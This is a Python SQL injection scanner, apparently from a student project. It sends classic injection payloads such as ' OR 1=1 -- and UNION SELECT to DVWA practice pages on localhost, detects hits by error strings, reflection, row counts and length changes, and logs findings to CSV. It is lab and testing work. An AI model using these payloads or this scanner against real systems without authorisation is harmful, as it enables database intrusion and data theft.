# sqli_scanner.py
import requests
import pandas as pd
from tqdm import tqdm
from pathlib import Path
import json
import re
from utils import log

RESULTS_DIR = Path.cwd() / "results"
CRAWL_FILE = RESULTS_DIR / "week2_crawl_results.json"
SQL_OUTPUT = RESULTS_DIR / "week3_sqlscan_results.csv"

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "' UNION SELECT 1,2,3 --"
]

SQL_ERRORS = [
    "SQL syntax",
    "mysql_fetch",
    "Warning: mysql",
    "error in your SQL",
    "mysql_num_rows",
    "You have an error in your SQL"
]

# token phrases that indicate a result row on DVWA sqli pages
DVWA_ROW_MARKER = "First name"


def is_sql_error(text):
    for err in SQL_ERRORS:
        if err.lower() in text.lower():
            return True
    return False


def count_row_markers(text):
    # Count occurrences of the DVWA row marker (e.g., "First name")
    return len(re.findall(re.escape(DVWA_ROW_MARKER), text, flags=re.IGNORECASE))


def run_sqli(target="http://localhost"):
    log(1, "Running SQL Injection Scanner (improved detection)")

    # load crawl data
    log(2, "Loading crawl results...")
    if not CRAWL_FILE.exists():
        log(3, "ERROR: week2_crawl_results.json not found - run Week 2 first.")
        return

    with open(CRAWL_FILE, "r", encoding="utf-8") as f:
        pages = json.load(f)

    log(3, "Starting SQL Injection tests...")

    # Known DVWA SQLi pages
    dvwa_sql_pages = [
        "/vulnerabilities/sqli/",
        "/vulnerabilities/sqli_blind/"
    ]
    dvwa_sql_pages = [target.rstrip("/") + path for path in dvwa_sql_pages]

    # Build test URL set from crawler results and known pages
    test_urls = set()
    for page in pages:
        u = page.get("url", "")
        if "sqli" in u:
            test_urls.add(u)
    for p in dvwa_sql_pages:
        test_urls.add(p)

    test_urls = list(test_urls)
    log(4, f"Total URLs to test: {len(test_urls)}")

    findings = []

    for base_url in tqdm(test_urls, desc="Testing SQLi"):
        # Prepare baseline: fetch id=1 (GET) baseline page to compare against
        baseline_get = None
        baseline_get_len = 0
        baseline_get_rows = 0
        try:
            r = requests.get(base_url + "?id=1&Submit=Submit#", timeout=6)
            baseline_get = r.text
            baseline_get_len = len(baseline_get or "")
            baseline_get_rows = count_row_markers(baseline_get or "")
        except:
            baseline_get = ""
            baseline_get_len = 0
            baseline_get_rows = 0

        # For each payload, test GET and POST
        broken = False
        for payload in SQL_PAYLOADS:
            if broken:
                break

            # ---------- GET test ----------
            try:
                test_get_url = base_url.split("?", 1)[0] + f"?id={payload}&Submit=Submit#"
                rget = requests.get(test_get_url, timeout=6)
                text = rget.text or ""
            except:
                text = ""

            # detection method 1: SQL error string
            if is_sql_error(text):
                log(4, f"VULNERABLE (GET - error) → {test_get_url}")
                findings.append(["SQL Injection", test_get_url, "id", payload, "SQL error (GET)", "High"])
                broken = True
                break

            # detection method 2: reflected payload presence
            if payload in text:
                log(4, f"VULNERABLE (GET - reflected) → {test_get_url}")
                findings.append(["SQL Injection", test_get_url, "id", payload, "Payload reflected in response (GET)", "High"])
                broken = True
                break

            # detection method 3: row-count increase OR significant length diff vs baseline
            test_rows = count_row_markers(text)
            test_len = len(text)
            # If number of result rows increased compared to baseline, likely SQLi
            if test_rows > baseline_get_rows and test_rows > 0:
                log(4, f"VULNERABLE (GET - rowcount) → {test_get_url} (rows: {baseline_get_rows} -> {test_rows})")
                findings.append(["SQL Injection", test_get_url, "id", payload, f"Row count increased ({baseline_get_rows}->{test_rows})", "High"])
                broken = True
                break
            # Or if content length changed a lot (heuristic)
            if baseline_get_len > 0 and abs(test_len - baseline_get_len) / baseline_get_len > 0.30:
                log(4, f"VULNERABLE (GET - length-diff) → {test_get_url} (len {baseline_get_len} -> {test_len})")
                findings.append(["SQL Injection", test_get_url, "id", payload, "Significant content-length change (GET)", "High"])
                broken = True
                break

            # ---------- POST test ----------
            try:
                post_data = {"id": payload, "Submit": "Submit"}
                rpost = requests.post(base_url, data=post_data, timeout=6)
                tpost = rpost.text or ""
            except:
                tpost = ""

            if is_sql_error(tpost):
                log(4, f"VULNERABLE (POST - error) → {base_url} payload={payload}")
                findings.append(["SQL Injection", base_url, "id", payload, "SQL error (POST)", "High"])
                broken = True
                break

            if payload in tpost:
                log(4, f"VULNERABLE (POST - reflected) → {base_url} payload={payload}")
                findings.append(["SQL Injection", base_url, "id", payload, "Payload reflected in response (POST)", "High"])
                broken = True
                break

            post_rows = count_row_markers(tpost)
            post_len = len(tpost)
            if post_rows > baseline_get_rows and post_rows > 0:
                log(4, f"VULNERABLE (POST - rowcount) → {base_url} payload={payload} (rows {baseline_get_rows}->{post_rows})")
                findings.append(["SQL Injection", base_url, "id", payload, f"Row count increased (POST) ({baseline_get_rows}->{post_rows})", "High"])
                broken = True
                break

            if baseline_get_len > 0 and abs(post_len - baseline_get_len) / baseline_get_len > 0.30:
                log(4, f"VULNERABLE (POST - length-diff) → {base_url} payload={payload} (len {baseline_get_len}->{post_len})")
                findings.append(["SQL Injection", base_url, "id", payload, "Significant content-length change (POST)", "High"])
                broken = True
                break

        # end payload loop

    # Save findings
    df = pd.DataFrame(findings, columns=["module", "endpoint", "parameter", "payload", "evidence", "severity"])
    df.to_csv(SQL_OUTPUT, index=False)
    log(5, f"SQL scan complete. Results saved to: {SQL_OUTPUT}")
    print()
